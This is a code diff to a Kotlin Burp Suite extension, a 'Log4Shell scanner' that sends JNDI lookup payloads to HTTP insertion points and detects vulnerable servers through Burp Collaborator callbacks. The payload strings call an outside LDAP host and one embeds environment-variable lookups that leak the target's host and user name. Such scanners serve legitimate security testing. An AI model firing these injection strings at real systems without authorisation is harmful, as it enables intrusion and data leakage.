@@ -23,6 +23,7 @@ import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 
 const val NAME = "Log4Shell scanner"
+const val QUERY_NOTHING = 'q'
 const val QUERY_HOSTNAME = 'h'
 const val QUERY_HOSTUSER = 'u'
 
@@ -67,9 +68,10 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
     override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
         val context = mutableListOf<Pair<IHttpRequestResponse, IntArray>>()
         val collabResults = mutableListOf<IBurpCollaboratorInteraction>()
-        for ((prefix, key) in listOf(Pair(QUERY_HOSTNAME, "hostName"), Pair(QUERY_HOSTUSER, "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
+        for ((prefix, key) in listOf(Pair(QUERY_NOTHING, null), Pair(QUERY_HOSTNAME, "hostName"), Pair(QUERY_HOSTUSER, "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
             val payload = collaborator.generatePayload(false)
-            val bytes = "\${jndi:ldap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
+            val keyLookup = if (key == null) "" else "\${$key}"
+            val bytes = "\${jndi:ldap://${prefix}${keyLookup}.$payload.${collaborator.collaboratorServerLocation}:99999/s2test}".toByteArray()
             val request = insertionPoint!!.buildRequest(bytes)
             val poff = insertionPoint.getPayloadOffsets(bytes)
             val hs = baseRequestResponse!!.httpService
